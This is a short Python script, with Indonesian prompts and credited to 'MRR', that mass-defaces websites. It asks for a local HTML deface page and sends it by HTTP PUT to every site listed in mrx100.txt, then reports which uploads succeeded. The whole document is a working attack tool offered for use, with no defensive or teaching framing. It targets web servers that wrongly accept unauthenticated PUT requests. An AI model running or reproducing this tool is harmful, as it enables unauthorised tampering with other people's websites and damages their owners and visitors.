#-*- coding: utf-8 -*-

try:
   import requests
   import os.path
   import sys
except ImportError:
   exit("install requests and try again ...")

tampil = """

###################################################
# Athour   : MRR                     #
#
################################################### """

b = '\033[31m'
h = '\033[32m'
m = '\033[00m'

def x(put):
   ipt = ''
   if sys.version_info.major > 2:
      ipt = input(put)
   else:
      ipt = raw_input(put)
   
   return str(ipt)

def auto(script,target_file="mrx100.txt"):
   op = open(script,"r").read()
   with open(target_file, "r") as target:
      target = target.readlines()
      s = requests.Session()
      print("Mengupload script deface ke %d website"%(len(target)))
      for web in target:
         try:
            site = web.strip()
            if site.startswith("http://") is False:
               site = "http://" + site
            req = s.put(site+"/"+script,data=op)
            if req.status_code < 200 or req.status_code >= 250:
               print(m+"["+b+" -"+m+" ] %s/%s"%(site,script))
            else:
               print(m+"["+h+" +"+m+" ] %s/%s"%(site,script))

         except requests.exceptions.RequestException:
            continue
         except KeyboardInterrupt:
            print; exit()

def main(__bn__):
   print(__bn__)
   while True:
      try:
         nama = x("file html bnusa ~# ")
         if not os.path.isfile(nama):
            print("Script '%s' Tidak Ditemukan"%(nama))
            continue
         else:
            break
      except KeyboardInterrupt:
         print; exit()

   auto(nama)

if __name__ == "__main__":
    main(tampil)
